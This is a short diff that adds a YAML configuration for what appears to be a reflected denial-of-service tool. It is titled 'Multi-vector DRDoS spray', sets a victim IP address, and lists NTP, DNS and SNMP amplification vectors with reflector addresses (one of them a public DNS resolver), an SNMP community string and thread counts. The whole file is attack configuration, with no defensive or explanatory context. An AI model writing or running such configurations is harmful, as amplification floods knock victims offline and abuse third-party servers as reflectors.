@@ -1,0 +1,21 @@
+victim: 192.168.1.100
+meta:
+  name: Multi-vector DRDoS spray
+  description: NTP + DNS + SNMP simultaneous amplification
+vectors:
+  - type: ntp
+    reflectors:
+      - 1.2.3.4
+      - 5.6.7.8
+    threads: 4
+
+  - type: dns
+    reflectors:
+      - 8.8.8.8
+    threads: 4
+
+  - type: snmp
+    reflectors:
+      - 9.10.11.12
+    community: public
+    threads: 4
